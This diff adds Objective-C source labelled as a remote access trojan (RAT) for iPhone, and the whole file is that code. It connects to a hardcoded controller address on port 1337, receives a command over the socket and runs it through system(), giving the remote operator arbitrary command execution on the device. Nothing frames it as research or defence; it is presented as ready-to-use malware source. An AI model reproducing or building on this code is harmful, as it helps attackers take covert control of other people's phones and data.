@@ -1,0 +1,78 @@
+// Objective-C code for a simple RAT for iPhone
+
+// Import required libraries
+#import <Foundation/Foundation.h>
+#import <SystemConfiguration/SystemConfiguration.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+// Define IP address and port number of the remote server
+#define SERVER_IP "192.168.1.100"
+#define SERVER_PORT 1337
+
+// Declare functions for socket communication with the server
+int connectToServer(const char *ip, int port);
+void sendToServer(int sockfd, const void *buf, size_t len);
+void recvFromServer(int sockfd, void *buf, size_t len);
+
+// Main function that runs the RAT
+int main(int argc, char *argv[]) {
+    // Connect to the remote server
+    int sockfd = connectToServer(SERVER_IP, SERVER_PORT);
+    if (sockfd < 0) {
+        exit(1);
+    }
+
+    // Send a greeting message to the server
+    const char *greeting = "Hello, server!";
+    sendToServer(sockfd, greeting, strlen(greeting));
+
+    // Receive a command from the server
+    char command[1024];
+    recvFromServer(sockfd, command, sizeof(command));
+
+    // Execute the command
+    system(command);
+
+    // Close the socket and exit
+    close(sockfd);
+    return 0;
+}
+
+// Function to connect to the remote server
+int connectToServer(const char *ip, int port) {
+    struct sockaddr_in serverAddr;
+    memset(&serverAddr, 0, sizeof(serverAddr));
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(ip);
+    serverAddr.sin_port = htons(port);
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("ERROR opening socket");
+        return -1;
+    }
+    if (connect(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
+        perror("ERROR connecting");
+        return -1;
+    }
+    return sockfd;
+}
+
+// Function to send data to the remote server
+void sendToServer(int sockfd, const void *buf, size_t len) {
+    ssize_t n = send(sockfd, buf, len, 0);
+    if (n < 0) {
+        perror("ERROR writing to socket");
+        exit(1);
+    }
+}
+
+// Function to receive data from the remote server
+void recvFromServer(int sockfd, void *buf, size_t len) {
+    ssize_t n = recv(sockfd, buf, len, 0);
+    if (n < 0) {
+        perror("ERROR reading from socket");
+        exit(1);
+    }
+}
